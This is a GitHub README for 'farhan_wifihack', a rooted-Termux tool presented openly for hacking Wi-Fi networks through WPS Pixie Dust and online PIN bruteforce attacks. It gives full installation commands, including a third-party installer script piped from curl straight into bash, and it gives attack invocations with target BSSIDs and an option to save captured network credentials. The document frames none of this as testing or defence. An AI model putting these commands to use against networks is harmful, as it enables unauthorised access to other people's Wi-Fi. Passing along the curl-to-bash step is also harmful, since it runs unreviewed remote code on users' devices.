# farhan_wifihack
![Logo](images/image.png)

### im farhan❔
<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&pause=1000&color=FF032F&random=false&width=435&lines=%E0%A6%86%E0%A6%AE%E0%A6%BF+%E0%A6%AB%E0%A6%BE%E0%A6%B0%E0%A6%B9%E0%A6%BE%E0%A6%A8+%E0%A6%AE%E0%A7%81%E0%A6%B9%E0%A6%A4%E0%A6%BE%E0%A6%B8%E0%A6%BF%E0%A6%AE+-+im+farhan+muh+tasim+thanks+for+my+hacking+command+use+;Facebook+%3A+FARHAN+MUH+TASIM;YouTube+%3A+EVAN+ALONE;TELEGRAM+%3A+FARHAM+MUH+TASIM" alt="Typing SVG" /></a>


### wifi-hack
<p align="center"><img src="https://i.ibb.co/b1qqnbS/Photo-Lab-M-W-20231004-231206.jpg"></p>

[![Python 3.5](https://img.shields.io/badge/Python-3.5-yellow.svg)](http://www.python.org/download/)
[![python](https://img.shields.io/badge/python-2.7-brightgreen.svg)](https://www.python.org/downloads/release/python-2714/)
[![OS](https://img.shields.io/badge/Tested%20On-Linux%20%7C%20Android-yellowgreen.svg)](https://termux.com/)

### Hack wifi using Termux (rooted)
    
- [Requirements]
  - [Python](https://www.python.org)
  - [Pixiewps](https://www.kali.org/tools/pixiewps/)
  - [Wpa-supplicant](https://wiki.archlinux.org/title/wpa_supplicant)

### How to update WifiHack
To check for updates and update, run the following command:
```
(cd farhan_wifihack && git pull)
```

# farhan_wifihack_Termux_installer/LINK
```
 https://github.com/Gtajisan/farhan_wifihack_Installer
 ```



# Overview
**farhan_wifihack** performs [Pixie Dust attack](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-Offline-WPS-Attack) without having to switch to monitor mode.
# Features
 - [Pixie Dust attack](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-Offline-WPS-Attack);
 - integrated [3WiFi offline WPS PIN generator](https://3wifi.stascorp.com/wpspin);
 - [online WPS bruteforce](https://sviehb.files.wordpress.com/2011/12/viehboeck_wps.pdf);
 - Wi-Fi scanner with highlighting based on iw;
# Requirements
**all source**
 - Python 3.6 and above;
 - [Wpa supplicant](https://www.w1.fi/wpa_supplicant/);
 - [Pixiewps](https://github.com/wiire-a/pixiewps);
 - [iw](https://wireless.wiki.kernel.org/en/users/documentation/iw).

Please note that root access is required.  

### Installation one line:
**run with one line**

```bash
apt update && apt upgrade && pkg install tsu && pkg install python && pkg install git && pkg install -y root-repo && pkg install -y git tsu python wpa-supplicant pixiewps iw openssl && termux-setup-storage && curl -sSf https://raw.githubusercontent.com/gtajisan/farhan_wifihack_Termux_installer/master/installer.sh | bash && git clone --depth 1 https://github.com/gtajisan/farhan_wifihack farhan_wifihack && sudo python farhan_wifihack/farhan_wifihack.py -i wlan0 --iface-down -K
```


## [Termux](https://termux.com/)
Please note that root access is required.  

### Hack WIfi Using Termux! (Requires Root)
<p align="center"><img src="https://i.postimg.cc/zGXq5sxw/Screenshot-20231025-133509-Termux.png"></



#### Using installer
**for one time setup**
 ```
 curl -sSf https://raw.githubusercontent.com/gtajisan/farhan_wifihack_Termux_installer/master/installer.sh | bash
 ```
#### Manually
**Installing requirements**
 ```
pkg update
pkg upgrade
pkg install tsu
pkg install python
pkg install git
pkg install -y root-repo
pkg install -y git tsu python wpa-supplicant pixiewps iw openssl
termux-setup-storage
 ```
### Getting farhan_wifihack
**run farhan hack py**
 ```
 git clone --depth 1 https://github.com/gtajisan/farhan_wifihack farhan_wifihack
 ```
 ```
 cd farhan_wifihack
 ```

#### Running
 ```
 sudo python farhan_wifihack/farhan_wifihack.py -i wlan0 -K
 ```

## [Termux](https://termux.com/)


# Usage
```
 farhan_wifihack.py <arguments>
 Required arguments:
     -i, --interface=<wlan0>  : Name of the interface to use

 Optional arguments:
     -b, --bssid=<mac>        : BSSID of the target AP
     -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
     -K, --pixie-dust         : Run Pixie Dust attack
     -B, --bruteforce         : Run online bruteforce attack
     --push-button-connect    : Run WPS push button connection

 Advanced arguments:
     -d, --delay=<n>          : Set the delay between pin attempts [0]
     -w, --write              : Write AP credentials to the file on success
     -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)
     -X, --show-pixie-cmd     : Alway print Pixiewps command
     --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnwsc.txt']
     --iface-down             : Down network interface when the work is finished
     -l, --loop               : Run in a loop
     -r, --reverse-scan       : Reverse order of networks in the list of networks. Useful on small displays
     --mtk-wifi               : Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit
                                (for internal Wi-Fi adapters implemented in MediaTek SoCs). Turn off Wi-Fi in the system settings before using this.
     -v, --verbose            : Verbose output
 ```

## Usage examples
Start Pixie Dust attack on a specified BSSID:
 ```
cd farhan_wifihack && sudo python3 farhan_wifihack.py -i wlan0 -b 00:90:4C:C1:AC:21 -K
 ```
Show avaliable networks and start Pixie Dust attack on a specified network:
 ```
cd farhan_wifihack &&  sudo python3 farhan_wifihack.py -i wlan0 -K
 ```
Launch online WPS bruteforce with the specified first half of the PIN:
 ```
cd farhan_wifihack &&  sudo python3 farhan_wifihack.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234
 ```
 Start WPS push button connection:s
 ```
cd farhan_wifihack &&  sudo python3 farhan_wifihack.py -i wlan0 --pbc
 ```

## Troubleshooting
#### "RTNETLINK answers: Operation not possible due to RF-kill"
 Just run:
```sudo rfkill unblock wifi```
#### "Device or resource busy (-16)"
 Try disabling Wi-Fi in the system settings and kill the Network manager. Alternatively, you can try running farhan_wifihackwith ```--iface-down``` argument.
#### The wlan0 interface disappears when Wi-Fi is disabled on Android devices with MediaTek SoC
 Try running farhan_wifihackwith the `--mtk-wifi` flag to initialize Wi-Fi device driver.
# Acknowledgements
## Special Thanks
* `rofl0r` for initial implementation;
* `Monohrom` for testing, help in catching bugs, some ideas;
* `Wiire` for developing Pixiewps.
* `binod-xd` for inspire.
* support on `oneshot`.


